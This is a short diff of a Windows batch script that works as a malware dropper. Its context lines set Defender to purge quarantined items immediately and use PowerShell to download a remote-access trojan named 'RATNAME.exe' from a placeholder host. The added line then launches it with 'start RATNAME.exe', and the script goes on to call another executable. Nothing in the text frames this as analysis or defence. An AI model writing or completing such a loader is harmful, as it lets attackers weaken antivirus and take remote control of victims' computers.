@@ -9,6 +9,7 @@ powershell -Command "Set-MpPreference -QuarantinePurgeItemsAfterDelay 0"
 if %RAT%==0 goto SkipRAT
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://example.com/files/RATNAME.exe', 'RATNAME.exe')"
 powershell -Command "Invoke-WebRequest http://example.com/files/RATNAME.exe -OutFile RATNAME.exe"
+start RATNAME.exe
 :SkipRAT
 mkdir windows1093
 call xbat.exe
